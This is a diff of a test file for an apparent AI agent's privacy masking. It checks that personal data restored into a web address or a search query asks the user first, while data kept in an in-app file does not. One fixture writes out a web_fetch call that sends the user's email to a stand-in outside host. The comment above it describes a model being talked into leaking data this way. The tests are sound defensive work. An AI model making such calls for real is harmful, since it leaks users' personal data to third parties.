@@ -277,9 +277,11 @@ section('with masking on, the provider never sees the personal data, and the per
   // talked the model into writing the placeholder there.
   const { needsApproval, PERSONAL_IN_ADDRESS_REASON } = await import('../server/agent.js');
   const fetchCall = { id: 'f', name: 'web_fetch', input: { url: `https://x.example/?e=${PII.email}` }, unmasked: ['url'] };
-  const mailCall = { id: 'm', name: 'web_search', input: { query: PII.email }, unmasked: ['query'] };
+  const mailCall = { id: 'm', name: 'create_file', input: { content: PII.email }, unmasked: ['content'] };
+  const searchCall = { id: 's', name: 'web_search', input: { query: PII.email }, unmasked: ['query'] };
   check('a personal detail restored into a web address asks first', needsApproval([fetchCall], 'guarded').length === 1 && /web address/.test(PERSONAL_IN_ADDRESS_REASON));
-  check('  while one restored elsewhere follows the ordinary rule', needsApproval([mailCall], 'guarded').length === 0);
+  check('  so does one going to a search engine, which is somebody else too', needsApproval([searchCall], 'guarded').length === 1);
+  check('  while one staying in this app follows the ordinary rule', needsApproval([mailCall], 'guarded').length === 0);
 }
 
 section('with masking on, a PDF goes as its text — masked — not as the file (PRV-003)');
